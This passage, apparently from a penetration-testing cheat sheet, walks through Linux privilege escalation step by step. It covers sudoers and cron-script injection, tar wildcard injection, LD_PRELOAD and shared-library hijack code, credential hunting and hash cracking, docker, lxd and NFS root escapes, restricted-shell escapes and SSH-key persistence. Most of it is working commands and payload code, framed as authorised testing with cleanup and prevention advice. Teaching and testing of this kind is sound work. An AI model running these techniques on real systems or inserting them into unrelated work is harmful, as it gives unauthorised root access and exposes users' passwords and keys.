**What `/etc/shadow` is:** the file holding actual password hashes, split out of `/etc/passwd` precisely so that ordinary users cannot read it. Correct permissions are `640`, owned by `root:shadow`, meaning root reads and writes, the `shadow` group reads, and everyone else gets nothing.

```bash
ls -la /etc/shadow
```

```
-rw-r--r-- 1 root shadow 1387 Mar  8 11:02 /etc/shadow
```

Read the permission string in three blocks of three:

| Block | Value | Who | Meaning |
|-------|-------|-----|---------|
| 1 | `rw-` | Owner (root) | Read and write |
| 2 | `r--` | Group (shadow) | Read |
| 3 | `r--` | **Everyone else** | **Read. This is the bug** |

The last block should be `---`. Because it is `r--`, every user on this host can read every password hash. That is a critical finding whether or not you manage to crack anything.

Look at what is inside:

```bash
head -2 /etc/shadow
```

```
root:$6$xyzsalt$3vN8kQ...9dF:19775:0:99999:7:::
mrb3n:$6$abcsalt$Kd0pQ...2mZ:19775:0:99999:7:::
```

The second field is the hash, itself split by `$`:

| Part | Meaning |
|------|---------|
| `$6$` | The algorithm. `6` is SHA-512 |
| `$xyzsalt$` | The salt, random per user, so identical passwords produce different hashes |
| `3vN8kQ...9dF` | The hash itself |

| Prefix | Algorithm | Cracking speed |
|--------|-----------|----------------|
| `$1$` | MD5-crypt | Fast |
| `$5$` | SHA-256 | Slow |
| `$6$` | SHA-512 | Slow |
| `$y$` | yescrypt | Very slow |
| `*` or `!` | **Locked account.** No password can match. Skip it | |

Cracking is Section 15.

### Writable sudoers

```bash
ls -la /etc/sudoers.d/
```

`/etc/sudoers.d/` is a directory of additional rule files, which sudo reads alongside the main file. Administrators often relax its permissions while automating deployments.

```bash
echo "mrb3n ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/99-pwn
sudo su -
```

Reading the rule: user `mrb3n`, on `ALL` hosts, may run as `(ALL)` users, with `NOPASSWD`, the command set `ALL`. That is unrestricted root.

The `99-` prefix matters: files are read in alphabetical order and later rules win, so a high number ensures your rule is not overridden.

### Writable systemd unit files

**What a unit file is:** the configuration that tells systemd how to start a service, including the command to run and the user to run it as. Most run as root.

```bash
find /etc/systemd/system /lib/systemd/system -writable -type f 2>/dev/null
```

```
/etc/systemd/system/backup.service
```

Edit the `ExecStart` line, which is the command systemd executes:

```ini
[Service]
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
```

This copies bash to `/tmp/rootbash` and sets the SUID bit on the copy. The copy is owned by root because a root process created it.

```bash
/tmp/rootbash -p
```

**Why copy bash rather than start a shell directly:** systemd runs services in the background with no terminal, so an interactive shell would be unusable. Leaving a SUID copy behind lets you claim root on your own terms afterwards.

---

## 11. Cron Jobs and Scheduled Tasks

**What cron is:** a scheduler. It runs commands at fixed times as a chosen user, usually root. It is how backups, log rotation, and cleanup scripts run unattended.

**Why it is a top three escalation path:** cron runs the script as root but does not care who **owns** the script. An administrator writes a backup script, works on it as their own user, leaves it writable, and every user on the host now has a root shell on a five minute timer.

### Where to look

```bash
cat /etc/crontab
```

The system crontab has an extra field the others do not: the user to run as.

```
# m h dom mon dow user  command
*/5 *  *   *   *  root  /opt/scripts/backup.sh
0   3  *   *   *  root  /usr/bin/tar -czf /backup/web.tgz /var/www/html/*
```

| Field | Value | Meaning |
|-------|-------|---------|
| minute | `*/5` | **Every 5 minutes.** `*/n` means "every n" |
| hour | `*` | Every hour |
| day of month | `*` | Every day |
| month | `*` | Every month |
| day of week | `*` | Every weekday |
| user | `root` | **Runs with root privileges** |
| command | `/opt/scripts/backup.sh` | What it runs |

`*/5` is good news. It means you wait at most five minutes to see a result. `0 3 * * *` runs once at 3 a.m., which you cannot wait for during a test.

The other locations:

```bash
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
crontab -l
ls -la /var/spool/cron/crontabs/ 2>/dev/null
systemctl list-timers --all
```

| Location | What it holds |
|----------|---------------|
| `/etc/cron.d/` | Individual job files, same format as `/etc/crontab` |
| `/etc/cron.daily/` | Scripts run once a day, no schedule line inside them |
| `crontab -l` | Your own user's jobs |
| `/var/spool/cron/crontabs/` | Every user's personal jobs. Usually unreadable by you |
| `systemctl list-timers` | **systemd timers**, a modern replacement for cron that people forget to check |

### Check who can write the script

```bash
ls -la /opt/scripts/backup.sh
```

```
-rwxrwxrwx 1 root root 219 Mar  8 09:14 /opt/scripts/backup.sh
```

`rwxrwxrwx` is `777`, world writable. A root-owned script that anyone can edit, executed as root every five minutes.

### Append, do not overwrite

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
```

**Why `>>` and why this payload:**

| Choice | Reason |
|--------|--------|
| `>>` not `>` | Appending keeps the client's backup working. Overwriting breaks production and gets you noticed |
| Copy bash, set SUID | Cron has no terminal, so a reverse shell or interactive shell is awkward. A SUID copy waits for you |
| `chmod +s` | Sets the SUID bit. The copy is root-owned because root's cron created it |

Wait for the schedule, then:

```bash
ls -la /tmp/rootbash
```

```
-rwsr-sr-x 1 root root 1113504 Mar  8 09:20 /tmp/rootbash
```

The `s` bits appeared, so the job ran.

```bash
/tmp/rootbash -p
```

```
rootbash-4.4# id
uid=1000(mrb3n) euid=0(root)
```

### Jobs you cannot see

Personal crontabs in `/var/spool/cron/crontabs/` are not readable by you, so `cat /etc/crontab` shows nothing and you wrongly conclude there is no cron job. Watch the process list instead.

```bash
./pspy64 -pf -i 1000
```

```
2026/03/12 10:35:01 CMD: UID=0  PID=3421 | /bin/bash /opt/scripts/cleanup.sh
2026/03/12 10:35:01 CMD: UID=0  PID=3422 | /usr/bin/tar -czf /backup/web.tgz /var/www/html/*
2026/03/12 10:40:01 CMD: UID=0  PID=3455 | /bin/bash /opt/scripts/cleanup.sh
```

| Observation | Conclusion |
|-------------|------------|
| `UID=0` | Running as root |
| Same command at `:35` and `:40` | A five minute schedule |
| A path you have not seen in any crontab | **A hidden job.** Go and check its permissions |

Run pspy early and leave it running while you work through other sections.

---

## 12. Wildcard Injection

**What it is:** the shell expands `*` into a list of filenames **before** the command runs. The command then receives those filenames as arguments. If a filename looks like a command-line option, the command treats it as one.

**Why this is not obvious:** the vulnerability is not in the script and not in the program. It is in the gap between them. `tar -czf backup.tgz *` looks completely reasonable.

### Spot it

From the crontab above:

```
0 3 * * * root /usr/bin/tar -czf /backup/web.tgz /var/www/html/*
```

The `*` at the end is the trigger, and you need write access to `/var/www/html` to use it.

### How the expansion becomes an injection

If `/var/www/html` contains `index.php` and a file literally named `--checkpoint=1`, the shell expands the `*` and tar actually receives:

```
tar -czf /backup/web.tgz /var/www/html/index.php /var/www/html/--checkpoint=1
```

tar has no way to know that `--checkpoint=1` came from a filename. It parses it as an option.

| tar option | What it does |
|------------|--------------|
| `--checkpoint=1` | Print a progress message every 1 record |
| `--checkpoint-action=exec=...` | **Run a command at each checkpoint** |

Together they turn an archive operation into command execution.

### Set it up

```bash
cd /var/www/html
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > run.sh
chmod +x run.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh run.sh"
```

**Why `touch --`:** the `--` tells `touch` that everything after it is a filename, not an option. Without it, `touch` would try to interpret `--checkpoint=1` as its own option and fail.

Wait for 3 a.m., or for the job's schedule, then:

```bash
/tmp/rootbash -p
```

### The same flaw in other programs

| Command in the script | Injected filename | Effect |
|-----------------------|-------------------|--------|
| `tar ... *` | `--checkpoint-action=exec=sh x.sh` | Command execution |
| `rsync ... *` | `-e sh x.sh` | Command execution |
| `chown user *` | `--reference=myfile` | Copy ownership from a file you control |
| `chmod 644 *` | `--reference=myfile` | Copy permissions from a file you control |

**How to recognise it generally:** any script that passes a wildcard to a program that accepts `--` options. Search for it:

```bash
grep -rnE "(tar|rsync|chown|chmod|zip).*\*" /etc/cron* /opt /usr/local/bin 2>/dev/null
```

---

## 13. LD_PRELOAD and Shared Object Hijacking

**What a shared object is:** a library of compiled code, `.so` on Linux, loaded into a program at startup instead of being built into it. `libc.so.6` holds `printf`, `system`, and most of the C standard library, and nearly every program uses it.

**Who loads it:** the dynamic linker, `ld.so`, which runs before the program's own `main()` function. It finds each required library by searching a list of directories, and several environment variables influence that search.

**The vulnerability:** if you control which library gets loaded, your code runs inside a privileged process before that process does anything.

### Why the shell must run as root for this to matter

Setting `LD_PRELOAD` on your own command only affects your own process, which is already yours. It becomes an escalation only when a **privileged** program inherits the variable. That normally cannot happen, because the linker ignores these variables for SUID binaries, and sudo clears the environment. Both defences have to be switched off by configuration.

### LD_PRELOAD through sudo

```bash
sudo -l | grep -i env
```

```
Defaults    env_reset, env_keep+=LD_PRELOAD
```

| Setting | Effect |
|---------|--------|
| `env_reset` | Clear the environment before running the command. The safe default |
| `env_keep+=LD_PRELOAD` | **Except this variable, which is preserved.** The bug |

Administrators add this to make a Java or Oracle application work, then forget it.

Write the library:

```c
// /tmp/pre.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

| Line | Why it is there |
|------|-----------------|
| `void _init()` | A special function the linker runs **as soon as the library loads**, before the program starts |
| `unsetenv("LD_PRELOAD")` | Removes the variable, so the shell you spawn does not try to load this library again and loop forever |
| `setresuid(0,0,0)` | Sets real, effective, and saved user IDs all to 0. Allowed, because the process is already root |
| `system("/bin/bash -p")` | Start a shell that keeps the privileges |

Compile it:

```bash
gcc -fPIC -shared -o /tmp/pre.so /tmp/pre.c -nostartfiles
```

| Flag | Meaning |
|------|---------|
| `-fPIC` | Position independent code, required for shared libraries |
| `-shared` | Produce a `.so` rather than an executable |
| `-nostartfiles` | Do not link the normal C startup files, which is what lets `_init` be defined this way |

Run it:

```bash
sudo LD_PRELOAD=/tmp/pre.so /usr/sbin/apache2
```

The variable is set on the sudo command line, sudo keeps it because of `env_keep`, apache2 starts as root, the linker loads your library first, and `_init` runs immediately.

```
root@web01:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

apache2 never started. Your code ran before it got the chance.

### LD_LIBRARY_PATH

Same idea, different variable. `LD_LIBRARY_PATH` adds directories to the front of the library search path, so you replace a library the program genuinely needs rather than preloading an extra one.

```bash
ldd /usr/sbin/apache2
```

`ldd` lists the shared libraries a binary requires and where the linker currently finds each one.

```
libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f0e2c1a0000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0e2bd90000)
```

Pick one and build a replacement with the same filename:

```c
// /tmp/libcrypt.c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

`__attribute__((constructor))` marks the function to run at load time. It does the same job as `_init` but is the modern form, and it does not need `-nostartfiles`.

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/libcrypt.c
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
```

### Hijacking a library a program already looks for

This one needs no sudo entry at all. Some custom software ships with its libraries in a non-standard place.

```bash
ldd /usr/local/bin/payroll
```

```
libcustom.so => /home/mrb3n/.config/libcustom.so (0x00007f2b1c5000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

**Read that first line again.** The binary loads a library from a path inside your own home directory. If `payroll` is SUID root (Section 7), you write the library and it executes as root.

```bash
gcc -shared -fPIC -o /home/mrb3n/.config/libcustom.so /tmp/hijack.c
/usr/local/bin/payroll
```

A `=> not found` in `ldd` output is just as good: the library is missing, so nothing has to be overwritten. Find which directory the linker searches and drop your file there.

```bash
cat /etc/ld.so.conf.d/*.conf
```

These files list additional library directories. A writable one is a finding, because the next time root runs `ldconfig` your directory becomes a trusted source of libraries system-wide.

---

## 14. Credential Hunting

**Why this comes before kernel exploits in practice:** passwords are written down far more often than kernels are left unpatched. A config file with a database password takes thirty seconds to find and carries none of the risk of an exploit.

**What you are looking for:** anything that lets you become a different user. That user does not have to be root. A service account with a sudo rule is just as good, and moving sideways is often the only way forward.

### Config files

```bash
grep -rniE "password|passwd|pwd|secret|api[_-]?key|token" /var/www /opt /srv /etc 2>/dev/null | grep -v Binary
```

| Flag | Meaning |
|------|---------|
| `-r` | Recurse into subdirectories |
| `-n` | Show line numbers, so you can go straight there |
| `-i` | Case insensitive, catches `Password` and `PASSWORD` |
| `-E` | Extended regex, enables `\|` and `?` |
| `api[_-]?key` | Matches `apikey`, `api_key`, and `api-key` |
| `grep -v Binary` | Drops the "Binary file matches" noise |

```
/var/www/html/config.php:12: $db_pass = 'Summer2024!Db';
/opt/payroll/db.conf:4: password=Pr0dP4yr0ll2024
```

### The specific files worth checking by name

```bash
find / \( -name "*.env" -o -name "wp-config.php" -o -name "settings.py" \
  -o -name "*.bak" -o -name "*.old" \) 2>/dev/null
```

`\( ... \)` groups the conditions so `-o`, meaning "or", applies to all of them. The backslashes stop your shell from interpreting the parentheses.

**Why backups matter more than the live file:** `config.php.bak` is usually left `644` when `config.php` is correctly locked down, because backup files are created by hand and nobody thinks about their permissions.

### SSH keys

```bash
find / -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" 2>/dev/null
ls -la /home/*/.ssh/ /root/.ssh/ 2>/dev/null
```

A private key with no passphrase is an immediate login as its owner. Keys are also reused across hosts, so one key can unlock the rest of the environment.

```bash
chmod 600 id_rsa
ssh -i id_rsa root@10.10.10.5
```

`chmod 600` is required. SSH refuses to use a key that other users can read, and the error message does not make the reason obvious.

### History and environment

```bash
cat ~/.bash_history
find /home -name ".*history" -exec cat {} \; 2>/dev/null
```

Shell history captures passwords typed on the command line, which happens constantly with `mysql -u root -pPASSWORD`.

```
mysql -u root -pR00tMySQLpw
scp backup.tgz deploy@10.10.10.9
sudo -u backupsvc /opt/scripts/run.sh
```

The third line is worth as much as the password: it tells you a sudo rule exists that you would otherwise have to guess at.

```bash
grep -z -i "pass" /proc/*/environ 2>/dev/null | tr '\0' '\n'
```

**What this does:** `/proc/<pid>/environ` holds the environment variables of a running process, including secrets passed in at startup. `-z` tells grep the records are null-separated, which is how that file is formatted, and `tr '\0' '\n'` converts the nulls to newlines so the output is readable. You can only read this for processes you own, but that includes anything you started.

### Then reuse what you find

**This is the step people skip.** Password reuse across local accounts, SSH, databases, and sudo is the norm.

```bash
su backupsvc          # local account
ssh root@127.0.0.1    # SSH, even to the same host
mysql -u root -p      # database
sudo -l               # re-check sudo rules as the new user
```

Every time you land on a new user, **start Section 3 again from `id` and `sudo -l`**. The escalation path is often two short hops rather than one long one.

---

## 15. Cracking What You Find

**What cracking is:** hashes cannot be reversed. You guess a password, hash the guess the same way, and compare. A cracker just does this very quickly with a wordlist.

**When it is worth doing:** when you have hashes and no other path, or when you suspect the password is reused elsewhere. A cracked password is often more valuable than root on one host, because it travels.

### Preparing shadow hashes

John needs the username and the hash in one file. `/etc/passwd` has the usernames, `/etc/shadow` has the hashes, so they have to be merged.

```bash
cp /etc/passwd /tmp/p
cp /etc/shadow /tmp/s
unshadow /tmp/p /tmp/s > /tmp/unshadowed
```

`unshadow` ships with John and does exactly that merge. Take the files back to your own machine to crack, since cracking is CPU heavy and running it on a client host is both noisy and rude.

```bash
head -1 /tmp/unshadowed
```

```
root:$6$xyzsalt$3vN8kQ...9dF:0:0:root:/root:/bin/bash
```

The `x` that was in field 2 has been replaced by the real hash from `/etc/shadow`.

### Running John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed
```

| Piece | Meaning |
|-------|---------|
| `--wordlist=` | Try each line of this file as a guess. Without it John uses its own slower rules |
| `rockyou.txt` | 14 million real passwords from a 2009 breach. The standard starting wordlist |

John detects the hash type automatically from the `$6$` prefix.

```
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2])
Passw0rd!        (root)
1g 0:00:01:37 DONE (2026-03-12 11:04) 0.01023g/s 1847p/s 3694c/s
```

| Field | Meaning |
|-------|---------|
| `2 password hashes with 2 different salts` | Different salts means each has to be cracked separately. Salting is why you cannot crack them in one pass |
| `Passw0rd!  (root)` | **The password, and the account it belongs to** |
| `1g` | One hash guessed |
| `1847p/s` | Guesses per second. SHA-512 is deliberately slow, which is the point of it |

Recover results later, since John does not print them twice:

```bash
john --show /tmp/unshadowed
```

```
root:Passw0rd!:0:0:root:/root:/bin/bash
1 password hash cracked, 0 left
```

Now use it:

```bash
su root
```

### SSH keys with a passphrase

An encrypted private key is not useless. The passphrase is a password, so it can be cracked.

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

`ssh2john` converts the key file into a hash format John understands. The same helper exists for many formats: `zip2john`, `keepass2john`, `gpg2john`.

### hashcat equivalents

hashcat uses the GPU, which is far faster for slow hash types, but it needs the mode number stated explicitly.

```bash
hashcat -m 1800 hash.txt rockyou.txt
```

| Prefix in the hash | Algorithm | hashcat `-m` |
|--------------------|-----------|--------------|
| `$1$` | MD5-crypt | 500 |
| `$5$` | SHA-256 | 7400 |
| `$6$` | SHA-512 | 1800 |
| `$2y$` | bcrypt | 3200 |

---

## 16. Privileged Group Membership

**What this is:** certain groups grant powers that add up to root, without any bug being involved. The system is working exactly as designed. Adding a user to one of these groups **is** granting root, and administrators frequently do not realise it.

Check your groups first:

```bash
id
```

```
uid=1000(mrb3n) groups=1000(mrb3n),4(adm),6(disk),999(docker),1001(lxd)
```

| Group | Why it is root |
|-------|----------------|
| **docker** | Can start containers that mount the host filesystem |
| **lxd** | Same, with LXD containers |
| **disk** | Raw access to block devices, which bypasses file permissions entirely |
| **shadow** | Reads `/etc/shadow` |
| **adm** | Reads all logs, which leak credentials |
| **video** | Reads the framebuffer, meaning the console screen |

### docker

**Why membership is root:** the docker command is a thin client. The actual work is done by a daemon running as root. Anything you ask for happens with root privileges, including mounting the host's root filesystem into a container.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

| Piece | What it does |
|-------|--------------|
| `run` | Start a container |
| `-v /:/mnt` | **Mount the host's `/` at `/mnt` inside the container** |
| `--rm` | Delete the container when you exit, leaving less behind |
| `-it` | Interactive, with a terminal |
| `alpine` | A small image |
| `chroot /mnt sh` | Make `/mnt`, which is the host filesystem, the new root, then start a shell |

```
# id
uid=0(root) gid=0(root)
# cat /root/root.txt
```

You are root on the **host**, not just in a container, because after the `chroot` every path you touch is the host's.

If there is no internet to pull an image, use one already present:

```bash
docker images
docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt bash
```

### lxd

Same principle, more steps. You import an image, create a **privileged** container, and attach the host disk.

```bash
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage pwned -c security.privileged=true
lxc config device add pwned host disk source=/ path=/mnt/root recursive=true
lxc start pwned
lxc exec pwned /bin/sh
```

| Command | What it does |
|---------|--------------|
| `image import` | Add an image locally, since there is usually no internet |
| `-c security.privileged=true` | **Disable user namespace isolation**, so container root is host root |
| `config device add ... source=/` | Attach the host's root filesystem as a disk |
| `exec pwned /bin/sh` | Get a shell inside |

```bash
cd /mnt/root/root
```

Without `security.privileged=true` the container's root maps to an unprivileged host user and the files stay unreadable, so that flag is the whole technique.

### disk

**Why this works:** file permissions are enforced by the filesystem layer. Reading the block device directly skips that layer entirely, so `/etc/shadow` is just bytes on a disk you are allowed to read.

```bash
df -h /
```

Tells you which device holds `/`.

```
/dev/sda1   20G  8.2G   11G  45% /
```

```bash
debugfs /dev/sda1
```

`debugfs` is an ext filesystem debugger. It reads the filesystem structures itself rather than going through the kernel's permission checks.

```
debugfs: cat /etc/shadow
debugfs: cat /root/.ssh/id_rsa
```

Read-only in practice, but reading root's SSH key is enough.

### adm

Not root, but logs contain credentials constantly, because commands typed with a password on the command line end up in `auth.log`.

```bash
grep -rniE "password|COMMAND=" /var/log/ 2>/dev/null | head -20
```

```
/var/log/auth.log:4412: sudo:  deploy : TTY=pts/0 ; COMMAND=/usr/bin/mysql -u root -pSpr1ng2024
```

### shadow

```bash
cat /etc/shadow
```

Go to Section 15.

---

## 17. Services Running as Root

**What this covers:** a service that runs as root and accepts input from you. You do not need a shell as root if you can make root's process do the work.

### Find the custom ones

```bash
ps -eo user,pid,cmd --sort=user | grep "^root"
ls -la /usr/local/bin /opt
```

```
root  1123  /usr/local/bin/payroll-sync --config /opt/payroll/db.conf
```

### Check whether you can replace the binary

```bash
ls -la /usr/local/bin/payroll-sync
```

```
-rwxrwxr-x 1 root devs 18744 Mar  1 14:22 /usr/local/bin/payroll-sync
```

Reading the permission string: owner `root` has `rwx`, group `devs` has `rwx`, others have `r-x`. If `id` showed you in `devs`, **you can rewrite a binary that runs as root**.

```bash
cp /usr/local/bin/payroll-sync /tmp/payroll-sync.bak
printf '#!/bin/bash\nchmod +s /bin/bash\n' > /usr/local/bin/payroll-sync
```

Keep the backup. You must restore it, and during a test you may need to restore it in a hurry.

The payload sets the SUID bit on the real `/bin/bash`, which runs the next time the service restarts, usually at reboot or on the next deployment. On a short engagement, a boot-time service may not restart at all, so check whether you can trigger it:

```bash
systemctl restart payroll-sync 2>&1
sudo -l | grep systemctl
```

### Read the config it was handed

```bash
cat /opt/payroll/db.conf
```

```
db_host=127.0.0.1
db_user=root
db_pass=Pr0dP4yr0ll2024
```

This is why the `--config` path in `ps` output matters. The process told you where its secrets live.

### Databases running as root

**Why a root database is a privilege escalation path:** a database that runs as root writes files as root, and most databases have a way to write files or run commands.

```bash
mysql -u root -p
```

```sql
SELECT load_file('/etc/shadow');
```

`load_file` reads a file from disk with the server's privileges, which are root's. `SELECT ... INTO OUTFILE` is the write equivalent, and writing a file as root means writing to `/etc/passwd` or an SSH key file.

```sql
SELECT sys_exec('chmod +s /bin/bash');
```

`sys_exec` is not built in. It comes from a user defined function library, and it only exists if one has been installed or if you can write into the plugin directory. Check first:

```sql
SELECT @@plugin_dir;
SHOW VARIABLES LIKE 'secure_file_priv';
```

`secure_file_priv` restricts where file reads and writes may happen. Empty means no restriction, which is the vulnerable configuration.

### Reaching localhost services

Section 3 covered the tunnel. Once the port is forwarded, treat the service as you would any external target: identify the software and version, check it for known vulnerabilities, and test default credentials. Internal services are usually several versions behind.

---

## 18. NFS no_root_squash

**What NFS is:** a protocol for sharing directories over the network. The server exports a directory, clients mount it, and files appear local.

**What root squashing is:** by default, an NFS server maps requests from a remote root to the unprivileged `nobody` user. Otherwise anyone who is root on **any** client would be root over the share. That default mapping is called `root_squash`.

**The vulnerability:** `no_root_squash` turns that mapping off. Root on a client stays root on the server's files, and you are root on your own machine.

### Spot it

```bash
cat /etc/exports
```

```
/home/shared 10.10.10.0/24(rw,sync,no_root_squash)
```

| Option | Meaning |
|--------|---------|
| `rw` | Clients may write |
| `sync` | Writes are committed before replying |
| `no_root_squash` | **Root on the client is root here.** The vulnerability |

From outside, without a shell, the same thing is visible:

```bash
showmount -e 10.10.10.5
```

```
Export list for 10.10.10.5:
/home/shared 10.10.10.0/24
```

`showmount` lists exports but not their options, so you confirm `no_root_squash` by testing rather than by reading.

### Exploit it

**On your own machine, as root:**

```bash
mkdir /mnt/nfs
mount -o rw,vers=3 10.10.10.5:/home/shared /mnt/nfs
```

`vers=3` is worth specifying. NFSv4 handles identity differently and often will not behave as expected for this.

```bash
cp /bin/bash /mnt/nfs/rootbash
chown root:root /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash
```

You are root locally, so `chown` and `chmod +s` succeed. Because `no_root_squash` is set, the server records the file as genuinely owned by root with the SUID bit set.

**Back on the target, as the low privilege user:**

```bash
ls -la /home/shared/rootbash
```

```
-rwsr-sr-x 1 root root 1113504 Mar 12 11:20 /home/shared/rootbash
```

```bash
/home/shared/rootbash -p
```

```
rootbash-4.4# id
uid=1000(mrb3n) euid=0(root)
```

**Why this works at all:** the SUID bit is stored in the file's metadata on the server. The target host reads that metadata and honours it, with no way to know it was set from a different machine.

---

## 19. Escaping Restricted Shells

**What a restricted shell is:** a limited shell such as `rbash`, `rksh`, or `lshell`, given to accounts that should only run a few specific commands. It blocks `cd`, output redirection, changing PATH, and running programs by absolute path.

**Why escaping matters:** every other section of this sheet assumes a normal shell. If you cannot redirect output or change PATH, you cannot do any of it. Escaping is not privilege escalation, it is the prerequisite.

### Work out what you are in

```bash
echo $SHELL
echo $PATH
compgen -c | head -40
```

| Command | What it shows |
|---------|---------------|
| `echo $SHELL` | `rbash` or `lshell` names the restriction |
| `echo $PATH` | Often a single directory such as `/home/user/bin` |
| `compgen -c` | **Every command you are allowed to run.** This is your toolbox |

```
/bin/rbash
/home/mrb3n/bin
vi
python3
find
```

### The escape

**The principle:** the restriction is enforced by the shell. Any program that can start a new shell escapes it, because the new shell is a normal one. Restricted shells rarely block interpreters, since the account usually needs one to do its job.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

`pty.spawn` launches `/bin/bash` directly through the kernel, so `rbash` is never consulted about it.

Other routes, in the order you should try them:

```bash
# vi or vim: set the shell it launches, then launch it
vi
:set shell=/bin/bash
:shell

# pagers: ! runs a command
less /etc/passwd
!/bin/bash

# awk: same BEGIN block as Section 6
awk 'BEGIN {system("/bin/bash")}'

# find: -exec runs a command
find / -name nonexistent -exec /bin/bash \;

# ssh back into the host with a forced command
ssh user@localhost -t "bash --noprofile --norc"
```

The last one is worth understanding. `-t` forces a terminal, and `--noprofile --norc` skips the startup files, which are usually what set the restricted shell in the first place.

### After escaping

```bash
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
export SHELL=/bin/bash
```

Your PATH is still the restricted one, so most commands will appear to be missing until you fix it.

### When nothing is available

Bash built-ins run inside the shell process, so they work even when every external command is blocked. `echo` with a glob is a crude `ls`:

```bash
echo /etc/*
echo /home/*/.ssh/*
```

---

## 20. Container Awareness

**Why this section exists:** you get a shell, you run an exploit, you see `uid=0` and record root. If that shell was inside a container, you have root in a throwaway sandbox and the actual host is untouched. Check before you write the finding.

### Am I in a container

```bash
cat /proc/1/cgroup
```

PID 1 is the first process. On a normal host it is `systemd` or `init`. In a container its cgroup path names the container runtime.

```
12:pids:/docker/3f8a9c2b1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a
```

The `/docker/` path is the answer. Other confirmations:

```bash
ls -la /.dockerenv          # a marker file Docker creates
hostname                    # containers default to a short hex hostname
```

### What privileges does the container have

```bash
capsh --print
```

`capsh --print` lists the capabilities of the current process, using the same names as Section 8.

```
Current: = cap_chown,cap_dac_override,cap_sys_admin,cap_sys_ptrace+ep
```

`cap_sys_admin` should not be there. It permits mounting filesystems, which means you can mount the host's disk.

```bash
fdisk -l 2>/dev/null
mount /dev/sda1 /mnt
cat /mnt/root/.ssh/id_rsa
```

### Is the docker socket mounted

```bash
ls -la /var/run/docker.sock
```

```
srw-rw---- 1 root docker 0 Mar 12 09:00 /var/run/docker.sock
```

If that file exists inside the container, the container can talk to the **host's** docker daemon, which is Section 16 again from a new position.

```bash
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh
```

`-H` points the docker client at a specific socket rather than the default.

---

## 21. Proving Access and Cleaning Up

**Why proof matters:** a screenshot of a `#` prompt proves nothing. Prompts can be edited. Collect output that could only have been produced with root privileges.

```bash
id
hostname
ip a | grep "inet "
date
cat /etc/shadow | head -3
```

| Command | What it proves |
|---------|----------------|
| `id` | `uid=0` or `euid=0` |
| `hostname` and `ip a` | **Which host.** Ties the evidence to a specific machine |
| `date` | When, which matters if the client asks for a timeline |
| `head -3 /etc/shadow` | Only root can read this. Redact the hashes in the report |

Write down the exact commands you ran. The report needs a path a reader can follow, not a conclusion.

### Temporary persistence

You will lose your shell. Keeping a way back in saves time, but it must be removed.

```bash
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3Nza... pentest-2026-03" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

Put an identifiable comment on the key. `pentest-2026-03` makes it obvious to the client what it is and when it was added, and it makes it findable during cleanup.

### Cleanup

Keep a running list as you work, not at the end from memory.

```bash
rm -f /tmp/rootbash /tmp/pre.so /tmp/libcrypt.so.1 /dev/shm/exp /dev/shm/peas.txt
sed -i '/pentest-2026-03/d' /root/.ssh/authorized_keys
sed -i '/^hacker:/d' /etc/passwd
rm -f /etc/sudoers.d/99-pwn
cp /tmp/payroll-sync.bak /usr/local/bin/payroll-sync
```

`sed -i '/pattern/d' file` deletes matching lines in place, which is how you reverse an append without rewriting the whole file.

Things people forget:

| Left behind | Consequence |
|-------------|-------------|
| SUID bit on `/bin/bash` | **Every user on the host is root.** You made the system less secure than you found it |
| A line appended to a cron script | The payload keeps firing |
| An account in `/etc/passwd` | A permanent backdoor |
| A modified service binary | Breaks on next restart, or persists |

Undo the SUID bit explicitly if you set it on a real system binary:

```bash
chmod u-s,g-s /bin/bash
ls -la /bin/bash
```

```
-rwxr-xr-x 1 root root 1113504 /bin/bash
```

The `s` is gone. Verify, do not assume.

Hand the client the list of every file you created or modified, even the ones you removed.

---

## 22. Prevention

Every technique in this sheet comes from one of three mistakes: **a privileged process trusting something an unprivileged user controls**, **a permission granted more widely than needed**, or **software left unpatched.** The fixes follow the same three shapes.

### Fix the trust boundary

```bash
# in any script that runs as root: absolute paths, always
tar -czf /backup/home.tgz /home        # VULNERABLE, searches PATH
/bin/tar -czf /backup/home.tgz /home   # FIXED

# never pass a wildcard to a program that takes -- options
tar -czf /backup/web.tgz /var/www/html/*    # VULNERABLE
tar -czf /backup/web.tgz -C /var/www html   # FIXED
```

`-C /var/www html` changes directory and names `html` explicitly, so no wildcard is expanded and no filename can become an option.

### Fix the permissions

| Finding | Fix | Why it works |
|---------|-----|--------------|
